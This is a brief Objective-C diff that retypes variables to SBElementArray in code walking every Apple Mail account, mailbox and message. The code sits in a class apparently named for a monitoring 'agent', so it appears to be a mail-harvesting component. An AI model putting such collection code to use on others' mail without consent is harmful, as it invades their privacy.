@@ -156,7 +156,8 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
     }
     
     // retrieve accounts
-    mailAccount *accounts = [appleMail accounts];
+    //mailAccount *accounts = [appleMail accounts];
+    SBElementArray *accounts = [appleMail accounts];
     for (mailAccount *account in accounts)
     {
         NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
@@ -173,7 +174,8 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
         inAddr = [mailAddrs objectAtIndex:0];
             
         // retrieve mailboxes
-        mailMailbox *mailboxes = [account mailboxes];
+        //mailMailbox *mailboxes = [account mailboxes];
+        SBElementArray *mailboxes = [account mailboxes];
         for (mailMailbox *mbox in mailboxes)
         {
             NSAutoreleasePool *inner2 = [[NSAutoreleasePool alloc] init];
@@ -186,7 +188,8 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
                 return;
             }
             // retrieve messages
-            mailMessage *msgs = [mbox messages];
+            //mailMessage *msgs = [mbox messages];
+            SBElementArray *msgs = [mbox messages];
             for (mailMessage *msg in msgs)
             {
                 NSAutoreleasePool *inner3 = [[NSAutoreleasePool alloc] init];
